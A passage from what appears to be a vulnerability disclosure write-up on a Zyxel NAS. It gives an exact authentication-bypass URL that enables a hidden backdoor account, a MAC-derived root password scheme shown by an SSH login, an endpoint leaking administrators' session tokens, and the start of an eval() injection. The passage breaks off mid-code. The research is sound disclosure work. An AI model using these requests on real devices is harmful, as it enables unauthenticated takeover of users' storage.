<span class="line"><span style="color: #D8DEE9FF">        chosen_handler </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">handlers_ptr</span><span style="color: #81A1C1">-&gt;</span><span style="color: #D8DEE9">Handler</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">goto</span><span style="color: #D8DEE9FF"> LAB_00010c78</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #ECEFF4">}</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">      handlers_ptr </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> handlers_ptr </span><span style="color: #81A1C1">+</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">1</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">      index </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">handlers_ptr</span><span style="color: #81A1C1">-&gt;</span><span style="color: #D8DEE9">index</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #ECEFF4">}</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    chosen_handler </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">callback </span><span style="color: #81A1C1">*</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">0</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">LAB_00010c78: </span></span>
<span class="line"><span style="color: #D8DEE9FF">    userid </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">geteuid</span><span style="color: #ECEFF4">()</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #88C0D0">setuid</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">userid</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #88C0D0">signal</span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">11</span><span style="color: #ECEFF4">,(</span><span style="color: #8FBCBB">__sighandler_t</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">1</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    ret </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">*</span><span style="color: #D8DEE9FF">chosen_handler</span><span style="color: #ECEFF4">)()</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #88C0D0">freeCgi</span><span style="color: #ECEFF4">()</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #ECEFF4">}</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> ret</span><span style="color: #81A1C1">;</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span></code></pre></div>



<p>The module is extracting the “type” request parameter via <a>gcgiFetchString</a> and calls the backdoor if “type=sshd_tdc”. But what is the path?</p>



<p>Returning to the Apache config, we can get some good clues. For example, from AuthZyxelSkipPattern we know that the path “/desktop,/cgi-bin/weblogin.cgi” is allowed.</p>



<p>Since remote_help-cgi isn’t included in any “AuthZyxelSkipPattern”, it seems like authentication is required to access this endpoint. But wouldn’t it be nicer if we could do it without authentication?</p>



<p>Due to the subpar patching of CVE-2023-27992, we can just re-use the authentication bypass. “mod_auth_zyxel.so” is still happy with letting requests through, as long as the correct substring is in the path, so we just append “/favicon.ico” to our path, resulting in the complete path “/desktop,/cgi-bin/remote_help-cgi/favicon.ico?type=sshd_tdc”.</p>



<p>Sending a GET there gives us a nice, clean response:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;br&gt;
result=0
&lt;/body&gt;
&lt;/html&gt;" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #81A1C1">&lt;html&gt;</span></span>
<span class="line"><span style="color: #81A1C1">&lt;head&gt;</span></span>
<span class="line"><span style="color: #81A1C1">&lt;/head&gt;</span></span>
<span class="line"><span style="color: #81A1C1">&lt;body&gt;</span></span>
<span class="line"><span style="color: #81A1C1">&lt;br&gt;</span></span>
<span class="line"><span style="color: #D8DEE9FF">result=0</span></span>
<span class="line"><span style="color: #81A1C1">&lt;/body&gt;</span></span>
<span class="line"><span style="color: #81A1C1">&lt;/html&gt;</span></span></code></pre></div>



<p>And checking the content of /etc/shadow we now get:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="~ $ cat /etc/shadow
root /*snip*/0:13013:0:99999:7:::
NsaRescueAngel:$1$$7/Er5lOpm2KHsviT7M2dI1:13493:0:99999:7:::
bin:*:13013:0:99999:7:::" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #81A1C1">~</span><span style="color: #D8DEE9FF"> $ cat /etc/shadow</span></span>
<span class="line"><span style="color: #88C0D0">root</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/</span><span style="color: #81A1C1">*</span><span style="color: #A3BE8C">snip</span><span style="color: #81A1C1">*</span><span style="color: #A3BE8C">/0:13013:0:99999:7:::</span></span>
<span class="line"><span style="color: #88C0D0">NsaRescueAngel:$1$$7/Er5lOpm2KHsviT7M2dI1:13493:0:99999:7:::</span></span>
<span class="line"><span style="color: #88C0D0">bin:*:13013:0:99999:7:::</span></span></code></pre></div>



<p>We have successfully called the backdoor without authentication, and our account has been created. But what about the password?</p>



<h3 class="wp-block-heading" id="h-password-generation"><span class="ez-toc-section" id="password-generation"></span><a>Password generation</a><span class="ez-toc-section-end"></span></h3>



<p>We know the backdoor is calling “<a>makekey</a>” without parameters and appending “tdT” to its <a>stdout</a>, which is then used in “<a>makepwd</a>” before being inserted into the shadow file. A quick look at makepwd revealed that it doesn’t do much interesting outside of hashing, so let’s just focus on makekey. We bought the device, so we can just call it as it is.</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="~ $ makekey
Zimi3ffN
~ $ makekey -h
Usage: makekey [options] [&lt;mac_address&gt;]
Available options are:
  -e, --encrypt           Encrypt key for /etc/passwd
  -?, -h, --help          Print this message
  -v, --version           Show version
 
&lt;mac_address&gt;             MAC address of the device
                          If not presented, the program uses MAC from eth0." style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #81A1C1">~</span><span style="color: #D8DEE9FF"> $ makekey</span></span>
<span class="line"><span style="color: #88C0D0">Zimi3ffN</span></span>
<span class="line"><span style="color: #81A1C1">~</span><span style="color: #D8DEE9FF"> $ makekey -h</span></span>
<span class="line"><span style="color: #88C0D0">Usage:</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">makekey</span><span style="color: #D8DEE9FF"> [options] </span><span style="color: #ECEFF4">[</span><span style="color: #81A1C1">&lt;</span><span style="color: #D8DEE9FF">mac_address</span><span style="color: #81A1C1">&gt;</span><span style="color: #ECEFF4">]</span></span>
<span class="line"><span style="color: #88C0D0">Available</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">options</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">are:</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-e,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">--encrypt</span><span style="color: #D8DEE9FF">           </span><span style="color: #A3BE8C">Encrypt</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">key</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">for</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/etc/passwd</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-?,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-h,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">--help</span><span style="color: #D8DEE9FF">          </span><span style="color: #A3BE8C">Print</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">this</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">message</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-v,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">--version</span><span style="color: #D8DEE9FF">           </span><span style="color: #A3BE8C">Show</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">version</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #81A1C1">&lt;</span><span style="color: #D8DEE9FF">mac_address</span><span style="color: #81A1C1">&gt;</span><span style="color: #D8DEE9FF">             MAC address of the device</span></span>
<span class="line"><span style="color: #D8DEE9FF">                          </span><span style="color: #88C0D0">If</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">not</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">presented,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">the</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">program</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">uses</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">MAC</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">from</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">eth0.</span></span></code></pre></div>



<p>The output was “Zimi3ffN” so appending “tdT” we now know that the password is “Zimi3ffNtdT” on *this specific device*.&nbsp; Worth noting here is that this program seems to be based on MAC addresses, and if none provided, it uses what it finds on eth0. This means that the backdoor passwords at least are unique per device.</p>



<p>First a quick login test to make sure we are correct in that there is no extra magic:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="⋊&gt; ~ ssh -oPubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa NsaRescueAngel@192.168.0.103  
NsaRescueAngel@192.168.0.103's password: 
 
BusyBox v1.19.4 (2024-01-02 10:37:36 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.
/ # " style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #88C0D0">⋊&gt;</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">~</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">ssh</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-oPubkeyAcceptedAlgorithms=+ssh-rsa</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-o</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">HostKeyAlgorithms=+ssh-rsa</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">NsaRescueAngel@192.168.0.103</span><span style="color: #D8DEE9FF">  </span></span>
<span class="line"><span style="color: #88C0D0">NsaRescueAngel@192.168.0.103</span><span style="color: #88C0D0">&#039;s password: </span></span>
<span class="line"><span style="color: #88C0D0"> </span></span>
<span class="line"><span style="color: #88C0D0">BusyBox v1.19.4 (2024-01-02 10:37:36 CST) built-in shell (ash)</span></span>
<span class="line"><span style="color: #88C0D0">Enter &#039;</span><span style="color: #88C0D0">help</span><span style="color: #88C0D0">&#039; for a list of built-in commands.</span></span>
<span class="line"><span style="color: #88C0D0">/ # </span></span></code></pre></div>



<p>With that, we can safely assume makepwd is not modifying the password. This means that an unauthenticated attacker simply has to do the following to root the device:</p>



<ol class="wp-block-list">
<li>Enable the backdoor account</li>



<li>Calculate the password somehow.</li>
</ol>



<p>The second step requires the attacker to figure out the device MAC address first, which could be done by sniffing the network in the right circumstances. With the right understanding, the password can then be derived from the MAC address, or with access to a low-privileged account with ssh, “makekey” could be invoked. Finally, there’s always the option of finding a vulnerable endpoint which allows us access to “makekey”.</p>



<p>Obviously we want the latter, because that’s the coolest, but first let’s dump the MAC address for a more minimalistic approach.</p>



<p><em>An attacker can also just unpack the makekey binary from e.g. firmware files downloaded from zyxel and invoke it on their machine. Qemu supplies an emulator so it can be run even on x86_64 devices despite the binary being some sort of ARM.</em></p>



<h3 class="wp-block-heading" id="h-cve-2024-29976-privilege-escalation-and-information-disclosure-vulnerability"><span class="ez-toc-section" id="cve-2024-29976-%e2%80%93-privilege-escalation-and-information-disclosure-vulnerability"></span><a>CVE-2024-29976 &#8211; Privilege Escalation and Information Disclosure Vulnerability</a><span class="ez-toc-section-end"></span></h3>



<p>Simply opening the web page and authenticating to the application (as any user) while inspecting traffic, a request to “/cmd,/ck6fup6/system_main” was found. This sounded interesting, so from inspecting the code I found a callback named “show_allsessions” which reveals MAC addresses of all interfaces, but more interestingly it reveals all session tokens for all authenticated users, including administrators.</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="GET /cmd,/ck6fup6/system_main/show_allsessions
cookie: &lt;valid cookie&gt;

200 OK
{
&quot;allSessions&quot;: [
{
// [...]                                
&quot;user&quot;: &quot;admin&quot;,
&quot;type&quot;: [
&quot;admin&quot;
],
&quot;authtok&quot;: &quot;NxnSK6kw3o6sGprDjVq4i5dJGvqy-jqYo2lB9NxeP7zclxMIyMJ3wImBSABafbt7&quot;
}
]
}" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #88C0D0">GET</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/cmd,/ck6fup6/system_main/show_allsessions</span></span>
<span class="line"><span style="color: #88C0D0">cookie:</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">&lt;</span><span style="color: #A3BE8C">valid</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">cooki</span><span style="color: #D8DEE9FF">e</span><span style="color: #81A1C1">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #88C0D0">200</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">OK</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #88C0D0">&quot;allSessions&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> [</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #88C0D0">//</span><span style="color: #D8DEE9FF"> [...]                                </span></span>
<span class="line"><span style="color: #88C0D0">&quot;user&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">admin</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;type&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> [</span></span>
<span class="line"><span style="color: #88C0D0">&quot;admin&quot;</span></span>
<span class="line"><span style="color: #D8DEE9FF">],</span></span>
<span class="line"><span style="color: #88C0D0">&quot;authtok&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">NxnSK6kw3o6sGprDjVq4i5dJGvqy-jqYo2lB9NxeP7zclxMIyMJ3wImBSABafbt7</span><span style="color: #ECEFF4">&quot;</span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">]</span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span></code></pre></div>



<p>With this vulnerability, it would be possible to gain administrator access to the device from a low-privileged account. From there, SSH could be enabled, providing access to the “makekey” command which in conjunction with the other vulnerabilities can be used to completely compromise the device.</p>



<p>Still, we’re ultimately looking for something juicier here.</p>



<h3 class="wp-block-heading" id="h-cve-2024-29973-python-code-injection-vulnerability"><span class="ez-toc-section" id="cve-2024-29973-%e2%80%93-python-code-injection-vulnerability"></span><a>CVE-2024-29973 – Python Code Injection Vulnerability</a><span class="ez-toc-section-end"></span></h3>



<p>We know from CVE-2023-27992 that the Python webserver is using a lot of “eval()” calls.</p>



<p>&nbsp;Sadly, after the patch of that vulnerability last year, there are some filtering safeguards that prohibit us from constructing a valid “eval()” injection payload while also bypassing the mod_auth_zyxel.so module.</p>



<p>Fortunately, while patching this vulnerability, they added a new endpoint which uses the same approach as the old ones, and while doing so, implemented the same mistakes as its predecessors. I present: “simZysh”:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="class mainApplication(object):
    # Snip...

    # url_args: /foo/bar = (foo, bar)
    # request_args: json(body): {&quot;test&quot;: &quot;apa&quot;} = {&quot;test&quot;:&quot;apa&quot;}
    def simZysh(self, *url_args, **request_args):
        &quot;&quot;&quot;Simulate zyshcgi's output. GUI's broker shall set command as the following format:
                        'controller_name action_name {&quot;arg1&quot;: value, &quot;arg2&quot;: value, ...}'
                &quot;&quot;&quot;
        for i in url_args:
            if not check_str_format(i, 'url'):
                return tools_cherrypy.ARG_ERROR
 
        for key, value in request_args.items():
            if not check_str_format(key, 'request'):
                if not check_list(key):
                    return tools_cherrypy.ARG_ERROR
                
            if not check_str_format(value, 'request'):
                if not check_list(value):
                    return tools_cherrypy.ARG_ERROR
 
        r_value = {}
        c_index = 0
        while True:
            c_key = 'c%d' % c_index
            if request_args.has_key(c_key):
                controller_n, action_n, args = request_args[c_key].split(' ', 2)
                try:
                    controller = __import__('controllers.%s' % controller_n)
                    tmp_result = eval('controller.%s.%s(cherrypy=%s, arguments=%s)' % (
                     controller_n, action_n, 'cherrypy', args))
                    if not tmp_result:
                        raise ValueError
                    r_type = type(tmp_result)
                    if r_type == list:
                        r_value['zyshdata%d' % c_index] = tmp_result
                    else:
                        r_value['zyshdata%d' % c_index] = [
                         tmp_result]
                    r_value['errno%d' % c_index] = 0
                    r_value['errmsg%d' % c_index] = _('OK')
                except:
                    r_value['zyshdata%d' % c_index] = []
                    r_value['errno%d' % c_index] = -99999
                    r_value['errmsg%d' % c_index] = _('Execute Error')
 
            else:
                break
            c_index += 1
 
        return r_value
 
    simZysh.exposed = True" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #81A1C1">class</span><span style="color: #D8DEE9FF"> </span><span style="color: #8FBCBB">mainApplication</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">object</span><span style="color: #ECEFF4">):</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #616E88"># Snip...</span></span>
<span class="line"></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #616E88"># url_args: /foo/bar = (foo, bar)</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #616E88"># request_args: json(body): {&quot;test&quot;: &quot;apa&quot;} = {&quot;test&quot;:&quot;apa&quot;}</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #81A1C1">def</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">simZysh</span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">self</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">*</span><span style="color: #D8DEE9">url_args</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">**</span><span style="color: #D8DEE9">request_args</span><span style="color: #ECEFF4">):</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #ECEFF4">&quot;&quot;&quot;</span><span style="color: #A3BE8C">Simulate zyshcgi&#039;s output. GUI&#039;s broker shall set command as the following format:</span></span>
<span class="line"><span style="color: #A3BE8C">                        &#039;controller_name action_name {&quot;arg1&quot;: value, &quot;arg2&quot;: value, ...}&#039;</span></span>
<span class="line"><span style="color: #A3BE8C">                </span><span style="color: #ECEFF4">&quot;&quot;&quot;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">for</span><span style="color: #D8DEE9FF"> i </span><span style="color: #81A1C1">in</span><span style="color: #D8DEE9FF"> url_args</span><span style="color: #ECEFF4">:</span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">not</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">check_str_format</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">i</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">url</span><span style="color: #ECEFF4">&#039;</span><span style="color: #ECEFF4">):</span></span>
<span class="line"><span style="color: #D8DEE9FF">                </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> tools_cherrypy</span><span style="color: #ECEFF4">.</span><span style="color: #D8DEE9FF">ARG_ERROR</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">for</span><span style="color: #D8DEE9FF"> key</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> value </span><span style="color: #81A1C1">in</span><span style="color: #D8DEE9FF"> request_args</span><span style="color: #ECEFF4">.</span><span style="color: #88C0D0">items</span><span style="color: #ECEFF4">():</span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">not</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">check_str_format</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">key</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">request</span><span style="color: #ECEFF4">&#039;</span><span style="color: #ECEFF4">):</span></span>
<span class="line"><span style="color: #D8DEE9FF">                </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">not</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">check_list</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">key</span><span style="color: #ECEFF4">):</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> tools_cherrypy</span><span style="color: #ECEFF4">.</span><span style="color: #D8DEE9FF">ARG_ERROR</span></span>
<span class="line"><span style="color: #D8DEE9FF">                </span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">not</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">check_str_format</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">value</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">request</span><span style="color: #ECEFF4">&#039;</span><span style="color: #ECEFF4">):</span></span>
<span class="line"><span style="color: #D8DEE9FF">                </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">not</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">check_list</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">value</span><span style="color: #ECEFF4">):</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> tools_cherrypy</span><span style="color: #ECEFF4">.</span><span style="color: #D8DEE9FF">ARG_ERROR</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">        r_value </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{}</span></span>
<span class="line"><span style="color: #D8DEE9FF">        c_index </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">while</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">True</span><span style="color: #ECEFF4">:</span></span>
<span class="line"><span style="color: #D8DEE9FF">            c_key </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">c</span><span style="color: #EBCB8B">%d</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> c_index</span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> request_args</span><span style="color: #ECEFF4">.</span><span style="color: #88C0D0">has_key</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">c_key</span><span style="color: #ECEFF4">):</span></span>
<span class="line"><span style="color: #D8DEE9FF">                controller_n</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> action_n</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> args </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> request_args</span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">c_key</span><span style="color: #ECEFF4">].</span><span style="color: #88C0D0">split</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">2</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #D8DEE9FF">                </span><span style="color: #81A1C1">try</span><span style="color: #ECEFF4">:</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    controller </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">__import__</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">controllers.</span><span style="color: #EBCB8B">%s</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> controller_n</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    tmp_result </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">eval</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">controller.</span><span style="color: #EBCB8B">%s</span><span style="color: #A3BE8C">.</span><span style="color: #EBCB8B">%s</span><span style="color: #A3BE8C">(cherrypy=</span><span style="color: #EBCB8B">%s</span><span style="color: #A3BE8C">, arguments=</span><span style="color: #EBCB8B">%s</span><span style="color: #A3BE8C">)</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span></span>
